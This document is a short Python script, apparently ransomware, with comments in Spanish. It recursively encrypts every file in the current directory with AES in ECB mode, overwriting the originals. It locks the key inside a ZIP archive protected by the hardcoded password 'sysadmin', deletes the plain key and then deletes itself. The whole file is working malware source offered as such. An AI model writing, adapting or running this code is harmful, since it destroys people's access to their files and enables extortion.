#!/usr/bin/env python3
import os
import pyminizip
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

def encrpt(directory, key):
    # Crear un objeto de cifrado AES con la clave proporcionada en modo ECB
    cipher = AES.new(key, AES.MODE_ECB)    
    # Recorrer recursivamente el directorio y cifrar cada archivo encontrado
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            # Omitir el script actual y los archivos ZIP
            if file_path == "rans.py" or file_path.endswith(".zip"):
                continue    
            # Leer el contenido del archivo
            with open(file_path, "rb") as f:
                content = f.read()    
            # Cifrar el contenido con AES y añadir relleno
            encrypted_content = cipher.encrypt(pad(content, AES.block_size))      
            # Escribir el contenido cifrado de vuelta al archivo
            with open(file_path, "wb") as f:
                f.write(encrypted_content)
def main():
    # Generar una clave aleatoria de 16 bytes
    key = get_random_bytes(16)
 
    # Guardar la clave en un archivo
    with open("key.key", "wb") as key_file:
        key_file.write(key)

    # Comprimir el archivo de clave y protegerlo con contraseña en un archivo ZIP
    pyminizip.compress("key.key", None, "key.zip", "sysadmin", 0)
    
    # Eliminar el archivo de clave original
    os.remove("key.key")

    # Cifrar los archivos en el directorio actual utilizando la clave generada
    encrpt(".", key)

    # Eliminar el propio script después de ejecutarse
    os.remove(__file__)

if __name__ == "__main__":
    main()
